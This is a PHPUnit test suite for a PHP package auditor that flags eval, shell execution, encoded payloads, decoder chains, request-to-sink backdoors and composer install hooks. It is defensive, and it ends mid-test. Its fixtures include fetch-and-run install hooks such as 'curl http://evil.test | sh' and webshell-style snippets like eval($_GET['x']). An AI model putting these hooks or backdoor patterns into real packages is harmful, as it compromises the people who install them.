<?php

declare(strict_types=1);

namespace Satiate\Tests\Audit;

use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use Satiate\Audit\Auditor;
use Satiate\Audit\AuditResult;
use Satiate\Audit\Severity;

#[CoversClass(Auditor::class)]
final class AuditorTest extends TestCase
{
    private Auditor $auditor;

    protected function setUp(): void
    {
        $this->auditor = new Auditor();
    }

    /**
     * @return iterable<string, array{string, int, string}>
     */
    public static function provideSuspiciousPatterns(): iterable
    {
        yield 'eval' => ['<?php eval($x);', 1, 'eval'];
        yield 'create_function' => ['<?php create_function("", "");', 1, 'create_function'];
        yield 'assert' => ['<?php assert($x);', 1, 'assert'];
        yield 'exec' => ['<?php exec("ls");', 1, 'command_execution'];
        yield 'system' => ['<?php system("id");', 1, 'command_execution'];
        yield 'shell_exec' => ['<?php shell_exec("ls");', 1, 'command_execution'];
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function provideCleanPatterns(): iterable
    {
        yield 'empty' => ['<?php'];
        yield 'echo' => ['<?php echo "hello";'];
        yield 'function' => ['<?php function foo() { return 1; }'];
        yield 'class' => ['<?php class Foo { public function bar(): void {} }'];
    }

    #[DataProvider('provideSuspiciousPatterns')]
    public function testDetectsSuspiciousPatterns(string $code, int $expectedCount, string $expectedPattern): void
    {
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, $code);

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertCount($expectedCount, $results);
        self::assertSame($expectedPattern, $results[0]->pattern);
    }

    #[DataProvider('provideCleanPatterns')]
    public function testCleanCodeProducesNoResults(string $code): void
    {
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, $code);

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertCount(0, $results);
    }

    public function testNonPhpFileIsSkipped(): void
    {
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.txt';
        file_put_contents($file, 'eval($x)');

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertCount(0, $results);
    }

    public function testNonExistentFileReturnsEmpty(): void
    {
        $results = $this->auditor->auditFile('test/pkg', '1.0', '/nonexistent/file.php');

        self::assertCount(0, $results);
    }

    public function testEvalIsCriticalSeverity(): void
    {
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, '<?php eval($x);');

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertSame(Severity::Critical, $results[0]->severity);
    }

    public function testAssertIsInfoSeverity(): void
    {
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, '<?php assert($x);');

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertSame(Severity::Info, $results[0]->severity);
    }

    // -------------------------------------------------------------------------
    // Mutant 1 (UnwrapTrim): whitespace-only PHP file must return empty results.
    // Without trim(), a file containing only spaces would be non-empty string and
    // would proceed to parsing (which produces no statements and no results anyway),
    // but the guard condition must short-circuit for whitespace-only content.
    // -------------------------------------------------------------------------
    public function testWhitespaceOnlyFileReturnsEmpty(): void
    {
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, "   \n\t  \n  ");

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertCount(0, $results);
    }

    // -------------------------------------------------------------------------
    // Mutant 2 (LogicalOr → LogicalAnd): validate the OR short-circuit.
    // A whitespace-only file has $contents !== false but trim === ''.
    // Changing || to && would mean whitespace files proceed to parsing instead
    // of returning []. The parse produces no stmts, so results would still be
    // empty — but the logical short-circuit behavior is what matters here.
    // We test a whitespace-only file returns [] AND a valid file returns results
    // to ensure both sides of the OR condition work independently.
    // -------------------------------------------------------------------------
    public function testEmptyStringFileAfterTrimReturnsEmpty(): void
    {
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        // Content is non-empty string but trims to empty — should return []
        file_put_contents($file, '     ');

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertSame([], $results);
    }

    // -------------------------------------------------------------------------
    // Mutant 2 (LogicalOr → LogicalAnd) continued: when file_get_contents
    // returns false (unreadable file), the || guard must return [] immediately.
    // With && instead, the code would proceed to $parser->parse(false) which
    // throws a TypeError that propagates uncaught (only PhpParser\Error is caught).
    // -------------------------------------------------------------------------
    public function testUnreadablePhpFileReturnsEmpty(): void
    {
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, '<?php eval($x);');
        chmod($file, 0000);

        // Suppress the file_get_contents "Permission denied" warning that comes
        // from Auditor.php (source code); we are verifying the return value only.
        set_error_handler(static fn () => true);
        try {
            $results = $this->auditor->auditFile('test/pkg', '1.0', $file);
        } finally {
            restore_error_handler();
            chmod($file, 0644);
            unlink($file);
        }

        self::assertCount(0, $results);
    }

    // -------------------------------------------------------------------------
    // Mutants 3 & 5 (DecrementInteger on major/minor): PHP 8.4 asymmetric
    // visibility syntax (public private(set)) is only valid in PHP 8.4+.
    // A PHP 7.4 or 8.3 parser would fail to parse it and return [].
    // With the correct (8, 4) parser, eval() inside such a file is detected.
    // -------------------------------------------------------------------------
    public function testPhp84AsymmetricVisibilitySyntaxIsParseableAndEvalDetected(): void
    {
        // PHP 8.4 asymmetric visibility — fails on PHP 7.4 and 8.3 parsers
        $code = '<?php class Foo { public private(set) string $name = ""; } eval($x);';
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, $code);

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        // The file mixes a class declaration with a top-level eval, so it also trips the PSR-1
        // heuristic; filter to the eval finding this test cares about.
        $evalResults = array_values(array_filter($results, static fn (AuditResult $r): bool => $r->pattern === 'eval'));
        self::assertCount(1, $evalResults);
        self::assertSame('eval', $evalResults[0]->pattern);
    }

    // -------------------------------------------------------------------------
    // Mutant 7 (MatchArmRemoval for base64_decode): base64_decode with an
    // encoded payload containing a dangerous keyword must be detected.
    // -------------------------------------------------------------------------
    public function testBase64DecodedPayloadIsDetected(): void
    {
        // base64_encode('eval($x);') === 'ZXZhbCgkeCk7'
        $code = '<?php base64_decode(\'ZXZhbCgkeCk7\');';
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, $code);

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertCount(1, $results);
        self::assertSame('encoded_payload', $results[0]->pattern);
        self::assertSame(Severity::Critical, $results[0]->severity);
    }

    public function testBase64DecodeWithInncocentStringProducesNoResult(): void
    {
        // base64_encode('hello world') — no dangerous keywords in decoded value
        $code = '<?php base64_decode(\'aGVsbG8gd29ybGQ=\');';
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, $code);

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertCount(0, $results);
    }

    // -------------------------------------------------------------------------
    // Mutant 8 (shell_exec removed from command_execution arm): already tested
    // above via provideSuspiciousPatterns. Added explicit severity test.
    //
    // Mutant 8 removes shell_exec — but it stays, so we verify it here too.
    // shell_exec is already covered by provideSuspiciousPatterns.
    // -------------------------------------------------------------------------

    // -------------------------------------------------------------------------
    // Mutants 8-10: passthru, popen, proc_open — each individually removed.
    // Add dedicated tests for each function that is not in the data provider.
    // -------------------------------------------------------------------------
    public function testPassthruIsDetectedAsCommandExecution(): void
    {
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, '<?php passthru("id");');

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertCount(1, $results);
        self::assertSame('command_execution', $results[0]->pattern);
        self::assertSame(Severity::Warning, $results[0]->severity);
    }

    public function testPopenIsDetectedAsCommandExecution(): void
    {
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, '<?php popen("id", "r");');

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertCount(1, $results);
        self::assertSame('command_execution', $results[0]->pattern);
        self::assertSame(Severity::Warning, $results[0]->severity);
    }

    public function testProcOpenIsDetectedAsCommandExecution(): void
    {
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, '<?php proc_open("id", [], $pipes);');

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertCount(1, $results);
        self::assertSame('command_execution', $results[0]->pattern);
        self::assertSame(Severity::Warning, $results[0]->severity);
    }

    // -------------------------------------------------------------------------
    // Mutants 11-13: file_get_contents, fwrite, fputs with binary blob.
    // Each is individually removable — need dedicated tests for each function.
    // -------------------------------------------------------------------------
    public function testFileGetContentsWithBinaryBlobIsDetected(): void
    {
        // String argument containing a null byte (binary suspicious)
        $code = "<?php file_get_contents(\"path\x00evil\");";
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, $code);

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        // file_get_contents() is also a protocol-wrapper function, so it additionally emits a
        // protocol_wrapper finding; assert specifically on the binary_blob one here.
        $binary = $this->ofPattern($results, 'binary_blob');
        self::assertCount(1, $binary);
        self::assertSame(Severity::Critical, $binary[0]->severity);
    }

    public function testFwriteWithBinaryBlobIsDetected(): void
    {
        $code = "<?php fwrite(\$handle, \"data\x00blob\");";
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, $code);

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertCount(1, $results);
        self::assertSame('binary_blob', $results[0]->pattern);
        self::assertSame(Severity::Critical, $results[0]->severity);
    }

    public function testFputsWithBinaryBlobIsDetected(): void
    {
        $code = "<?php fputs(\$handle, \"data\x00blob\");";
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, $code);

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertCount(1, $results);
        self::assertSame('binary_blob', $results[0]->pattern);
        self::assertSame(Severity::Critical, $results[0]->severity);
    }

    // -------------------------------------------------------------------------
    // Mutant 15 (PublicVisibility): results() must be callable as public API.
    // Call it directly on the Auditor instance (not just via auditFile return).
    // -------------------------------------------------------------------------
    public function testResultsMethodIsPublicAndReturnsAccumulatedResults(): void
    {
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, '<?php eval($x);');

        $this->auditor->auditFile('test/pkg', '2.0', $file);

        unlink($file);

        // Call results() directly to confirm it is public and returns the list
        $results = $this->auditor->results();

        self::assertCount(1, $results);
        self::assertSame('eval', $results[0]->pattern);
        self::assertSame('test/pkg', $results[0]->package);
        self::assertSame('2.0', $results[0]->version);
    }

    // -------------------------------------------------------------------------
    // Additional coverage: verify AuditResult fields are set correctly.
    // -------------------------------------------------------------------------
    public function testAuditResultContainsCorrectMetadata(): void
    {
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, '<?php eval($x);');

        $results = $this->auditor->auditFile('vendor/package', '3.1.4', $file);

        unlink($file);

        self::assertCount(1, $results);
        $result = $results[0];
        self::assertSame('vendor/package', $result->package);
        self::assertSame('3.1.4', $result->version);
        self::assertSame('eval', $result->pattern);
        self::assertSame(1, $result->line);
        self::assertStringContainsString('eval', $result->description);
    }

    // -------------------------------------------------------------------------
    // Dynamic include detection.
    // -------------------------------------------------------------------------
    public function testDynamicIncludeIsDetected(): void
    {
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, '<?php include $path;');

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertCount(1, $results);
        self::assertSame('dynamic_include', $results[0]->pattern);
        self::assertSame(Severity::Warning, $results[0]->severity);
    }

    // -------------------------------------------------------------------------
    // Command execution description contains the function name.
    // -------------------------------------------------------------------------
    public function testCommandExecutionDescriptionContainsFunctionName(): void
    {
        foreach (['exec', 'system', 'shell_exec', 'passthru', 'popen', 'proc_open'] as $fn) {
            $code = match ($fn) {
                'popen' => "<?php {$fn}('id', 'r');",
                'proc_open' => "<?php {$fn}('id', [], \$pipes);",
                default => "<?php {$fn}('id');",
            };
            $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
            file_put_contents($file, $code);

            $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

            unlink($file);

            self::assertCount(1, $results, "Expected 1 result for {$fn}");
            self::assertStringContainsString($fn, $results[0]->description, "Description should contain function name for {$fn}");
        }
    }

    // -------------------------------------------------------------------------
    // Mutant 3 (MatchArmRemoval of default arm): removing "default => null" in the
    // match expression would throw UnhandledMatchError for any FuncCall with a
    // function name not in the match arms. A file containing an ordinary user-defined
    // function call must still produce zero results (not throw an exception).
    // -------------------------------------------------------------------------
    public function testUnknownFunctionCallProducesNoResult(): void
    {
        // 'foo' and 'bar' are not in any match arm; removing default => null
        // would throw UnhandledMatchError at runtime.
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, '<?php foo(); bar("hello"); strlen("test");');

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertCount(0, $results);
    }

    // -------------------------------------------------------------------------
    // Mutants 4-6 (isPotentialPayload LogicalOr chain): each OR is mutated to AND
    // individually, meaning single-keyword payloads that don't also contain the
    // next keyword would go undetected. Test each dangerous keyword separately.
    // -------------------------------------------------------------------------
    public function testBase64PayloadWithExecKeywordIsDetected(): void
    {
        // base64_encode('exec("id")') — contains 'exec' but not eval/system/popen/curl_exec
        $payload = base64_encode('exec("id")');
        $code = "<?php base64_decode('{$payload}');";
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, $code);

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertCount(1, $results);
        self::assertSame('encoded_payload', $results[0]->pattern);
    }

    public function testBase64PayloadWithSystemKeywordIsDetected(): void
    {
        // base64_encode('system("id")') — contains 'system' but not eval/exec/popen/curl_exec
        $payload = base64_encode('system("id")');
        $code = "<?php base64_decode('{$payload}');";
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, $code);

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertCount(1, $results);
        self::assertSame('encoded_payload', $results[0]->pattern);
    }

    public function testBase64PayloadWithPopenKeywordIsDetected(): void
    {
        // base64_encode('popen("id","r")') — contains 'popen' but not eval/exec/system/curl_exec
        $payload = base64_encode('popen("id","r")');
        $code = "<?php base64_decode('{$payload}');";
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, $code);

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertCount(1, $results);
        self::assertSame('encoded_payload', $results[0]->pattern);
    }

    public function testBase64PayloadWithCurlExecKeywordIsDetected(): void
    {
        // base64_encode('curl_exec($ch)') — contains 'curl_exec' but not eval/exec/system/popen
        $payload = base64_encode('curl_exec($ch)');
        $code = "<?php base64_decode('{$payload}');";
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, $code);

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertCount(1, $results);
        self::assertSame('encoded_payload', $results[0]->pattern);
    }

    // -------------------------------------------------------------------------
    // Mutants 8 & 9 (isBinarySuspicious loop): off-by-one (<= strlen) or
    // inverted condition (!== 0) would make ALL non-empty strings suspicious.
    // A file with fwrite/fputs/file_get_contents and a clean ASCII string must
    // produce zero results.
    // -------------------------------------------------------------------------
    public function testFileOperationWithCleanStringProducesNoResult(): void
    {
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, '<?php file_get_contents("path/to/file.txt");');

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        // A clean ASCII path must NOT be flagged as a binary blob (kills the isBinarySuspicious
        // mutants). file_get_contents still emits a protocol_wrapper:info for its wrapper capability.
        self::assertCount(0, $this->ofPattern($results, 'binary_blob'));
        $wrapper = $this->ofPattern($results, 'protocol_wrapper');
        self::assertCount(1, $wrapper);
        self::assertSame(Severity::Info, $wrapper[0]->severity);
    }

    public function testFwriteWithCleanStringProducesNoResult(): void
    {
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, '<?php fwrite($handle, "Hello, world!");');

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertCount(0, $results);
    }

    public function testFputsWithCleanStringProducesNoResult(): void
    {
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, '<?php fputs($handle, "safe content here");');

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        self::assertCount(0, $results);
    }

    // -------------------------------------------------------------------------
    // composer.json install-time surface: shell hooks, plugins, autoload.files.
    // -------------------------------------------------------------------------

    /**
     * @return iterable<string, array{string}>
     */
    public static function provideComposerInstallEvents(): iterable
    {
        yield 'pre-install-cmd' => ['pre-install-cmd'];
        yield 'post-install-cmd' => ['post-install-cmd'];
        yield 'pre-update-cmd' => ['pre-update-cmd'];
        yield 'post-update-cmd' => ['post-update-cmd'];
        yield 'pre-autoload-dump' => ['pre-autoload-dump'];
        yield 'post-autoload-dump' => ['post-autoload-dump'];
        yield 'post-root-package-install' => ['post-root-package-install'];
        yield 'post-create-project-cmd' => ['post-create-project-cmd'];
    }

    #[DataProvider('provideComposerInstallEvents')]
    public function testShellCommandOnAnyInstallEventIsCritical(string $event): void
    {
        $hook = $this->ofPattern($this->auditComposer([
            'scripts' => [
                $event => 'curl http://evil.test | sh',
            ],
        ]), 'composer_install_hook');

        self::assertCount(1, $hook);
        self::assertSame(Severity::Critical, $hook[0]->severity);
    }

    public function testShellCommandArrayOnInstallEventFlagsEach(): void
    {
        $hook = $this->ofPattern($this->auditComposer([
            'scripts' => [
                'post-autoload-dump' => ['wget http://x -O- | sh', 'bash ./setup.sh'],
            ],
        ]), 'composer_install_hook');

        self::assertCount(2, $hook);
    }

    public function testClassMethodInstallHookIsNotFlagged(): void
    {
        self::assertCount(0, $this->ofPattern($this->auditComposer([
            'scripts' => [
                'post-install-cmd' => 'Acme\\Installer::postInstall',
            ],
        ]), 'composer_install_hook'));
    }

    public function testComposerScriptReferenceInstallHookIsNotFlagged(): void
    {
        // @php / @composer / @putenv references are Composer-internal, not raw shell.
        self::assertCount(0, $this->ofPattern($this->auditComposer([
            'scripts' => [
                'post-update-cmd' => ['@php artisan package:discover', '@putenv FOO=bar'],
            ],
        ]), 'composer_install_hook'));
    }

    public function testEmptyInstallHookCommandIsNotFlagged(): void
    {
        self::assertCount(0, $this->ofPattern($this->auditComposer([
            'scripts' => [
                'post-install-cmd' => '',
            ],
        ]), 'composer_install_hook'));
    }

    public function testCustomNonInstallScriptIsNotFlagged(): void
    {
        // "test"/"cs" are explicitly invoked, not auto-run on install — they must not be flagged.
        self::assertCount(0, $this->ofPattern($this->auditComposer([
            'scripts' => [
                'test' => 'phpunit',
                'cs' => 'phpcs src/',
            ],
        ]), 'composer_install_hook'));
    }

    public function testComposerPluginTypeIsWarning(): void
    {
        $plugin = $this->ofPattern($this->auditComposer([
            'type' => 'composer-plugin',
        ]), 'composer_plugin');

        self::assertCount(1, $plugin);
        self::assertSame(Severity::Warning, $plugin[0]->severity);
    }

    public function testNonPluginTypeIsNotFlagged(): void
    {
        self::assertCount(0, $this->ofPattern($this->auditComposer([
            'type' => 'library',
        ]), 'composer_plugin'));
    }

    public function testAutoloadFilesIsInfo(): void
    {
        $files = $this->ofPattern($this->auditComposer([
            'autoload' => [
                'files' => ['src/bootstrap.php'],
            ],
        ]), 'autoload_files');

        self::assertCount(1, $files);
        self::assertSame(Severity::Info, $files[0]->severity);
    }

    public function testEmptyAutoloadFilesIsNotFlagged(): void
    {
        self::assertCount(0, $this->ofPattern($this->auditComposer([
            'autoload' => [
                'psr-4' => [
                    'Acme\\' => 'src/',
                ],
            ],
        ]), 'autoload_files'));
    }

    public function testCleanComposerJsonHasNoFindings(): void
    {
        self::assertSame([], $this->auditComposer([
            'name' => 'acme/widget',
            'require' => [
                'php' => '>=8.0',
            ],
            'autoload' => [
                'psr-4' => [
                    'Acme\\' => 'src/',
                ],
            ],
        ]));
    }

    public function testComposerInstallHookTruncatesLongCommands(): void
    {
        $long = str_repeat('a', 100);

        $hook = $this->ofPattern($this->auditComposer([
            'scripts' => [
                'post-install-cmd' => $long,
            ],
        ]), 'composer_install_hook');

        self::assertCount(1, $hook);
        // Truncated to the first 77 characters plus an ellipsis.
        self::assertStringContainsString(substr($long, 0, 77) . '...', $hook[0]->description);
    }

    public function testComposerInstallHookLengthBoundary(): void
    {
        // Exactly 80 characters: kept intact. 81 characters: truncated.
        $exactly80 = str_repeat('a', 80);
        $over80 = str_repeat('b', 81);

        $at = $this->ofPattern($this->auditComposer([
            'scripts' => [
                'post-install-cmd' => $exactly80,
            ],
        ]), 'composer_install_hook');
        $over = $this->ofPattern($this->auditComposer([
            'scripts' => [
                'post-install-cmd' => $over80,
            ],
        ]), 'composer_install_hook');

        self::assertStringNotContainsString('...', $at[0]->description);
        self::assertStringContainsString('...', $over[0]->description);
    }

    public function testInvalidComposerJsonReturnsEmpty(): void
    {
        $file = tempnam(sys_get_temp_dir(), 'composer_');
        file_put_contents($file, 'this is not json');

        $results = $this->auditor->auditComposerJson('test/pkg', '1.0', $file);

        unlink($file);

        self::assertSame([], $results);
    }

    public function testInlinePhpInstallHookIsCritical(): void
    {
        $hook = $this->ofPattern($this->auditComposer([
            'scripts' => [
                'post-install-cmd' => '@php -r "system(\'id\');"',
            ],
        ]), 'composer_install_hook');

        self::assertCount(1, $hook);
        self::assertSame(Severity::Critical, $hook[0]->severity);
        self::assertStringContainsString('inline PHP', $hook[0]->description);
    }

    public function testAtPhpScriptFileHookIsNotFlagged(): void
    {
        // @php running a script file (no -r) is benign orchestration, not inline code.
        self::assertCount(0, $this->ofPattern($this->auditComposer([
            'scripts' => [
                'post-install-cmd' => '@php bin/setup.php',
            ],
        ]), 'composer_install_hook'));
    }

    public function testAtPhpunitWithRFlagIsNotTreatedAsInlinePhp(): void
    {
        // "@phpunit" must not be mistaken for "@php" with an -r flag.
        self::assertCount(0, $this->ofPattern($this->auditComposer([
            'scripts' => [
                'post-install-cmd' => '@phpunit -r',
            ],
        ]), 'composer_install_hook'));
    }

    public function testComposerJsonInsideArchiveIsAudited(): void
    {
        $zipPath = $this->makeZip([
            'composer.json' => (string) json_encode([
                'scripts' => [
                    'post-install-cmd' => 'curl http://evil.test | sh',
                ],
            ]),
            'src/Widget.php' => '<?php class Widget {}',
        ]);

        $results = $this->auditor->auditArchive('vendor/pkg', '1.0.0', $zipPath);

        unlink($zipPath);

        $hook = $this->ofPattern($results, 'composer_install_hook');
        self::assertCount(1, $hook);
        self::assertSame(basename($zipPath) . '/composer.json', $hook[0]->file);
    }

    // -------------------------------------------------------------------------
    // Multi-stage decoder chains — eval(gzinflate(base64_decode(...))) webshells.
    // -------------------------------------------------------------------------

    public function testEvalOfDecodedPayloadIsCritical(): void
    {
        $finding = $this->ofPattern($this->auditCode('<?php eval(base64_decode($x));'), 'eval_decoded_payload');

        self::assertCount(1, $finding);
        self::assertSame(Severity::Critical, $finding[0]->severity);
    }

    public function testEvalWithoutDecoderHasNoDecodedPayloadFinding(): void
    {
        $results = $this->auditCode('<?php eval($code);');

        // Plain eval is still flagged, but not as a decoded payload.
        self::assertCount(1, $this->ofPattern($results, 'eval'));
        self::assertCount(0, $this->ofPattern($results, 'eval_decoded_payload'));
    }

    public function testNestedDecodersAreFlaggedAsChain(): void
    {
        $chain = $this->ofPattern($this->auditCode('<?php $y = gzinflate(base64_decode($x));'), 'decoder_chain');

        self::assertCount(1, $chain);
        self::assertSame(Severity::Warning, $chain[0]->severity);
    }

    public function testPlainSingleDecoderIsNotFlaggedAsChain(): void
    {
        // A single base64_decode of a variable is common and benign — no decoder_chain.
        self::assertCount(0, $this->ofPattern($this->auditCode('<?php $y = base64_decode($x);'), 'decoder_chain'));
    }

    public function testEvalOfNestedDecodersFlagsBothPayloadAndChain(): void
    {
        $results = $this->auditCode('<?php eval(gzinflate(base64_decode($x)));');

        self::assertCount(1, $this->ofPattern($results, 'eval_decoded_payload'));
        self::assertCount(1, $this->ofPattern($results, 'decoder_chain'));
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function provideNestedDecoderPairs(): iterable
    {
        yield 'gzinflate(base64_decode)' => ['gzinflate(base64_decode($x))'];
        yield 'gzuncompress(base64_decode)' => ['gzuncompress(base64_decode($x))'];
        yield 'gzdecode(base64_decode)' => ['gzdecode(base64_decode($x))'];
        yield 'str_rot13(base64_decode)' => ['str_rot13(base64_decode($x))'];
        yield 'base64_decode(str_rot13)' => ['base64_decode(str_rot13($x))'];
        yield 'hex2bin(str_rot13)' => ['hex2bin(str_rot13($x))'];
        yield 'convert_uudecode(base64_decode)' => ['convert_uudecode(base64_decode($x))'];
    }

    #[DataProvider('provideNestedDecoderPairs')]
    public function testEveryNestedDecoderPairIsFlagged(string $expr): void
    {
        self::assertCount(1, $this->ofPattern($this->auditCode("<?php \$y = {$expr};"), 'decoder_chain'));
    }

    // -------------------------------------------------------------------------
    // Request input flowing directly into a dangerous sink — backdoor signature.
    // -------------------------------------------------------------------------

    public function testEvalOfRequestInputIsCritical(): void
    {
        $finding = $this->ofPattern($this->auditCode('<?php eval($_GET["x"]);'), 'request_to_sink');

        self::assertCount(1, $finding);
        self::assertSame(Severity::Critical, $finding[0]->severity);
    }

    public function testIncludeOfRequestInputIsCritical(): void
    {
        self::assertCount(1, $this->ofPattern($this->auditCode('<?php include $_REQUEST["p"];'), 'request_to_sink'));
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function provideCodeExecSinks(): iterable
    {
        yield 'system' => ['system($_GET["x"])'];
        yield 'exec' => ['exec($_GET["x"])'];
        yield 'shell_exec' => ['shell_exec($_GET["x"])'];
        yield 'passthru' => ['passthru($_GET["x"])'];
        yield 'popen' => ['popen($_GET["x"], "r")'];
        yield 'proc_open' => ['proc_open($_GET["x"], [], $pipes)'];
        yield 'pcntl_exec' => ['pcntl_exec($_GET["x"])'];
        yield 'assert' => ['assert($_GET["x"])'];
        yield 'create_function' => ['create_function("", $_GET["x"])'];
        yield 'unserialize' => ['unserialize($_GET["x"])'];
        yield 'preg_replace' => ['preg_replace($_GET["x"], "a", "b")'];
        yield 'call_user_func' => ['call_user_func($_GET["x"])'];
        yield 'call_user_func_array' => ['call_user_func_array($_GET["x"], [])'];
        yield 'extract' => ['extract($_GET)'];
    }

    #[DataProvider('provideCodeExecSinks')]
    public function testRequestInputIntoSinkIsCritical(string $call): void
    {
        $finding = $this->ofPattern($this->auditCode("<?php {$call};"), 'request_to_sink');

        self::assertCount(1, $finding);
        self::assertSame(Severity::Critical, $finding[0]->severity);
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function provideRequestSources(): iterable
    {
        yield '_GET' => ['$_GET["x"]'];
        yield '_POST' => ['$_POST["x"]'];
        yield '_REQUEST' => ['$_REQUEST["x"]'];
        yield '_COOKIE' => ['$_COOKIE["x"]'];
        yield '_FILES' => ['$_FILES["x"]["name"]'];
        yield 'getallheaders' => ['getallheaders()["X"]'];
        yield 'apache_request_headers' => ['apache_request_headers()["X"]'];
        yield 'php://input' => ['file_get_contents("php://input")'];
    }

    #[DataProvider('provideRequestSources')]
    public function testEveryRequestSourceIsDetectedInsideASink(string $source): void
    {
        self::assertCount(1, $this->ofPattern($this->auditCode("<?php eval({$source});"), 'request_to_sink'));
    }

    public function testServerSuperglobalIsNotTreatedAsRequestSource(): void
    {
        // $_SERVER mixes attacker headers with benign DOCUMENT_ROOT etc., so it must not flag — a
        // legitimate include($_SERVER['DOCUMENT_ROOT'].'/x.php') stays a plain dynamic_include only.
        $results = $this->auditCode('<?php include $_SERVER["DOCUMENT_ROOT"] . "/config.php";');

        self::assertCount(0, $this->ofPattern($results, 'request_to_sink'));
        self::assertCount(1, $this->ofPattern($results, 'dynamic_include'));
    }

    public function testSinkWithoutRequestInputIsNotFlagged(): void
    {
        self::assertCount(0, $this->ofPattern($this->auditCode('<?php eval($code); system($cfg);'), 'request_to_sink'));
    }

    public function testRequestSourceWithoutSinkIsNotFlagged(): void
    {
        self::assertCount(0, $this->ofPattern($this->auditCode('<?php echo $_GET["x"];'), 'request_to_sink'));
    }

    public function testMultipleRequestArgsInOneSinkReportOnce(): void
    {
        // Two request-controlled arguments in a single call must produce exactly one finding.
        self::assertCount(
            1,
            $this->ofPattern($this->auditCode('<?php preg_replace($_GET["a"], $_POST["b"], "c");'), 'request_to_sink'),
        );
    }

    // -------------------------------------------------------------------------
    // Native-code / sandbox-escape capabilities: FFI, dl(), ini_set tampering.
    // -------------------------------------------------------------------------

    /**
     * @return iterable<string, array{string}>
     */
    public static function provideFfiEntryPoints(): iterable
    {
        yield 'cdef' => ['FFI::cdef("int puts(char*);", "libc.so.6")'];
        yield 'load' => ['FFI::load("header.h")'];
        yield 'scope' => ['FFI::scope("MyLib")'];
        yield 'fully-qualified' => ['\\FFI::cdef("int x();")'];
    }

    #[DataProvider('provideFfiEntryPoints')]
    public function testFfiEntryPointIsWarning(string $call): void
    {
